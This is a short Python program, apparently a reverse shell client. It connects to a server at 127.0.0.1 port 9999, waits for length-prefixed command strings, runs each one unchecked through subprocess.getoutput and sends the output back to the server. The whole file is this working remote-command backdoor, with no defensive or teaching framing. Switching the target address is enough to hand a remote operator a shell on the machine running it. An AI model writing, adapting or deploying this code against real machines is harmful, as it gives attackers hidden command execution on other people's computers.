import socket
import subprocess 
import sys

HEADER = 64
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"

def client_create():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # socket.AF_INET is used for IPv4 addresses 

def client_connect():
    try:
        target_host = "127.0.0.1"  
        target_port = 9999
        s.connect((target_host, target_port))
        print("Connected to server!")
    except socket.error as msg:
        print("Connection error: " + str(msg))
        sys.exit()

def send_msg(msg):
    # send message length first padded to 64 bytes
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    s.send(send_length)
    s.send(message)

def receive_commands():
    while True:
        try:
            # get 64-byte header first
            msg_length = s.recv(HEADER).decode(FORMAT)
            
            if not msg_length:
                break

            msg_length = int(msg_length.strip())

            # get actual command text
            cmd = s.recv(msg_length).decode(FORMAT)

            if cmd.lower() == 'quit' or cmd == DISCONNECT_MESSAGE:
                s.close()
                sys.exit()

            if len(cmd) > 0:
                output = subprocess.getoutput(cmd)
                send_msg(output + "\n")

        except socket.error:
            print("Server disconnected!")
            s.close()
            sys.exit()

def main():
    client_create()
    client_connect()
    receive_commands()

main()